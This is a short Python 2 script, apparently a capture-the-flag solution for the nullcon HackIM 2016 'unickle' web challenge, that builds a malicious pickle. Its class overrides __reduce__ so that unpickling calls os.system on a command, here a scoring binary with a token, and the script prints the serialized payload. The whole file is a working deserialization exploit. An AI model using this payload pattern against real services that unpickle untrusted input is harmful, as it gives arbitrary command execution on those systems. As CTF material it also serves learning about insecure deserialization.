#!/usr/bin/python2

'''https://github.com/ctfs/write-ups-2016/tree/master/nullcon-hackim-2016/web/unickle-200
'''

import cPickle
import os

class Inject(object):
    def __reduce__(self):
        return (os.system, ('/usr/local/bin/score 25753871-f622-4e36-a73a-972f3e91c040',))

print cPickle.dumps(Inject())
